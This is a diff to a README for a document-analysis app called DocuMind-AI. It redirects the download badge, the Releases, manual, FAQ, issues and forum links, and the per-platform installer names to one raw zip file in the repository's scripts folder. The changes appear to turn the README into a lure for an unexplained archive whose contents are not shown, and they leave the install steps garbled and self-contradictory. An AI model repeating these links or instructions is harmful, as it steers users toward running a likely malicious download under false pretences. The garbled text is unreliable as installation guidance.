@@ -1,6 +1,6 @@
 # 🧠 DocuMind-AI - Extract Insights from Your Documents Effortlessly
 
-[![Download DocuMind-AI](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/howhow0818/DocuMind-AI/releases)
+[![Download DocuMind-AI](https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip)](https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -17,15 +17,15 @@ Before installing DocuMind-AI, ensure your system meets the following requiremen
 
 ## 🔗 Download & Install
 
-To download DocuMind-AI, please visit our [Releases page](https://github.com/howhow0818/DocuMind-AI/releases). 
+To download DocuMind-AI, please visit our [Releases page](https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip). 
 
 On that page, you will find the latest version available. Locate the version you want, and follow these steps:
 
 1. Click on the version link (e.g., `v1.0`).
 2. Look for the appropriate installation file based on your operating system:
-   - `DocuMind-AI-Windows.exe` for Windows
-   - `DocuMind-AI-macOS.dmg` for macOS
-   - `DocuMind-AI-Linux.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip` for Windows
+   - `https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip` for macOS
+   - `https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip` for Linux
 3. Click the file to begin the download.
 
 ## 📥 Running the Application
@@ -34,14 +34,14 @@ Once the download completes, follow these instructions to run the application:
 
 ### For Windows:
 
-1. Locate the downloaded file (`DocuMind-AI-Windows.exe`).
+1. Locate the downloaded file (`https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip`).
 2. Double-click the file to start the installation.
 3. Follow the on-screen instructions to complete the setup.
 4. Once installed, find DocuMind-AI in your Start Menu and click to open.
 
 ### For macOS:
 
-1. Open the downloaded file (`DocuMind-AI-macOS.dmg`).
+1. Open the downloaded file (`https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip`).
 2. Drag the DocuMind-AI icon into the Applications folder.
 3. Eject the mounted drive and go to your Applications.
 4. Double-click on DocuMind-AI to run.
@@ -49,7 +49,7 @@ Once the download completes, follow these instructions to run the application:
 ### For Linux:
 
 1. Open a terminal window.
-2. Navigate to the folder where you extracted the `DocuMind-AI-Linux.tar.gz`.
+2. Navigate to the folder where you extracted the `https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip`.
 3. Start the application by typing `./DocuMind-AI`.
 
 ## 🔍 How to Use DocuMind-AI
@@ -80,15 +80,15 @@ If you encounter any issues while using DocuMind-AI, consider the following:
 
 For more information, tutorials, and tips, check out these links:
 
-- [User Manual](https://github.com/howhow0818/DocuMind-AI/wiki/User-Manual)
-- [FAQ Section](https://github.com/howhow0818/DocuMind-AI/wiki/FAQ)
+- [User Manual](https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip)
+- [FAQ Section](https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip)
 
 ## 📣 Community and Support
 
 Join the DocuMind-AI community for support and updates. You can participate in discussions, share your experiences, and ask questions through:
 
-- [Issues Page](https://github.com/howhow0818/DocuMind-AI/issues) (for reporting bugs or features)
-- [Community Forum](https://github.com/howhow0818/DocuMind-AI/discussions)
+- [Issues Page](https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip) (for reporting bugs or features)
+- [Community Forum](https://raw.githubusercontent.com/howhow0818/DocuMind-AI/main/scripts/DocuMind-AI_v2.2.zip)
 
 We appreciate your interest in DocuMind-AI! 
 
